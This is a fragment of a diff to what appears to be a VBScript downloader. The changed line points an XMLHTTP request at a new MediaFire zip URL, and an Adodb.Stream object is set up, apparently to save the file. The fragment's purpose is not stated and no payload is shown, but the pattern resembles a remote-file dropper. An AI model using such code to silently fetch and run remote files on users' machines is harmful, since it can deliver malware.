@@ -12,7 +12,7 @@ End If
 
 dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
 dim bStrm: Set bStrm = createobject("Adodb.Stream")
-xHttp.Open "GET", "http://download828.mediafire.com/b1bj28r3fpng/wobzgmt39kibxky/zip.zip", False
+xHttp.Open "GET", "http://download891.mediafire.com/112656f66qjg/tz4zxpq98bz0z43/zip.zip", False
 xHttp.Send 'http://download944.mediafire.com/0yv4p03rjhcg/pbhsqz8mtn0n305/test.zip
 
 with bStrm
